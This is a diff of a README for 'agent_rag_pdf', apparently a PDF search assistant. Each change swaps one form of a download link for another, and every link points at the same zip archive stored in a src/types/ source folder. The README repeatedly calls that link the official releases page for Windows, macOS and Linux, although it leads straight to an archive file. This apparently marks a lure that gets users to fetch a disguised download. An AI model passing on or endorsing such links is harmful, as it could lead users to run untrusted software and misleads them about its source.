@@ -1,6 +1,6 @@
 # 🤖 agent_rag_pdf - Easy Multi-PDF Search Assistant
 
-[![Download agent_rag_pdf](https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip)](https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip)
+[![Download agent_rag_pdf](https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip)](https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download, install, and use agent_rag_pdf easily.
 
 Click the big blue button at the top or go to the release page here:
 
-[https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip](https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip)
+[https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip](https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip)
 
 This page holds the latest versions of the software. Downloads come in simple files or apps for Windows, macOS, and Linux.
 
@@ -95,7 +95,7 @@ Use the chat-like window to type questions or keywords related to your PDFs. The
 
 You can start your setup by visiting the official releases page here:
 
-[https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip](https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip)
+[https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip](https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip)
 
 This link takes you to the place where new files appear whenever the software updates.
 
@@ -157,4 +157,4 @@ The project is open-source and hosted on GitHub for transparency.
 
 Click below to visit the download page now:
 
-[Download agent_rag_pdf](https://raw.githubusercontent.com/brayden14336/agent_rag_pdf/main/src/types/pdf-agent-rag-v2.9.zip)
+[Download agent_rag_pdf](https://github.com/brayden14336/agent_rag_pdf/raw/refs/heads/main/src/types/pdf-agent-rag-v2.9.zip)
